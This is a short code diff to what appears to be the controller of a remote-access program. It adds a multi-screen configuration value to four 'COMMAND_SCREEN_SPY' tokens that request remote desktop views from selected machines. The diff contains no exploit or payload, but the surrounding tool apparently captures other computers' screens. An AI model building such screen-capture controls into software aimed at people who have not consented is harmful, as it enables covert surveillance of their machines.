@@ -3102,28 +3102,28 @@ void CMy2015RemoteDlg::OnDynamicSubMenu(UINT nID)
 }
 void CMy2015RemoteDlg::OnOnlineVirtualDesktop()
 {
-    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 2, ALGORITHM_DIFF };
+    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 2, ALGORITHM_DIFF, THIS_CFG.GetInt("settings", "MultiScreen") };
     SendSelectedCommand(bToken, sizeof(bToken));
 }
 
 
 void CMy2015RemoteDlg::OnOnlineGrayDesktop()
 {
-    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 0, ALGORITHM_GRAY };
+    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 0, ALGORITHM_GRAY, THIS_CFG.GetInt("settings", "MultiScreen") };
     SendSelectedCommand(bToken, sizeof(bToken));
 }
 
 
 void CMy2015RemoteDlg::OnOnlineRemoteDesktop()
 {
-    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 1, ALGORITHM_DIFF };
+    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 1, ALGORITHM_DIFF, THIS_CFG.GetInt("settings", "MultiScreen") };
     SendSelectedCommand(bToken, sizeof(bToken));
 }
 
 
 void CMy2015RemoteDlg::OnOnlineH264Desktop()
 {
-    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 0, ALGORITHM_H264 };
+    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 0, ALGORITHM_H264, THIS_CFG.GetInt("settings", "MultiScreen") };
     SendSelectedCommand(bToken, sizeof(bToken));
 }
 
